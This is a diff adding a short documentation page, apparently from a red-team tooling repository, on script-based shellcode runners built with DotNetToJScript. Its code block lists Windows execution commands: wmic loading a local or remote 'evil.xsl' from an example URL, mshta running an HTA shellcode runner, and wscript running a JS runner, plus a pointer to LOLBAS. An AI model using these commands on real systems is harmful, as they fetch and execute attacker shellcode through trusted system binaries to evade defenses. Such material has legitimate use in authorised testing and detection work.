@@ -1,0 +1,22 @@
+---
+title: "XSL / JS / HTA"
+description: "Script-based shellcode runners via DotNetToJScript."
+---
+
+Runners located under `payloads/DotNetToJScript/`.
+
+## Execution
+
+```cmd
+# XSL
+wmic process list /FORMAT:evil.xsl
+wmic os get /FORMAT:"https://example.com/evil.xsl"
+
+# HTA
+mshta c:\users\public\shellcode_runner.hta
+
+# JS
+wscript c:\users\public\shellcode_runner.js
+```
+
+More execution methods: [LOLBAS Project](https://lolbas-project.github.io/)
